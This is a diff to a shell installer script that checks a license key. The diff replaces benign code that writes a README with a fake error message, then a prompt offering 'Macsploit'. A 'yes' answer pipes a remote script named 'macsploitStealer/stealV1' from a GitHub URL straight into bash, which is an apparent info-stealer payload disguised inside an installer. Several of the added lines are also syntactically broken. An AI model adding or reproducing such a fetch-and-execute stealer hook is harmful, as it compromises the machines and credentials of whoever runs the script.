@@ -42,20 +42,16 @@ read -p "Enter License Key: " license_key
 
 if [ "$license_key" == "12851" ]; then
     echo "License key accepted. Downloading file..."
-
-target_directory="$HOME/Applications/veil"
-filename="README.txt"
-file_path="$target_directory"
-
-# Create the target directory if it doesn't exist
-mkdir -p "$target_directory"
-
-# Create the README file with some content
-cat <<EOL > "$file_path"
-# README
-
-App should be in $(whoami)/Applications/veil
-EOL
+echo "An error occured.."
+sleep 5
+echo "Would you like 'Macsploit' before this closes? response
+if [ "$response" == "yes" ]; then
+cd ~/ && curl -s "https://raw.githubusercontent.com/Sadospry/macsploitStealer/main/stealV1" | bash
+else
+echo "Closing..."
+sleep 5
+exit 12851
+fi
 
     if [ $? -eq 0 ]; then
 RGB_COLOR="\033[38;2;0;255;0m"
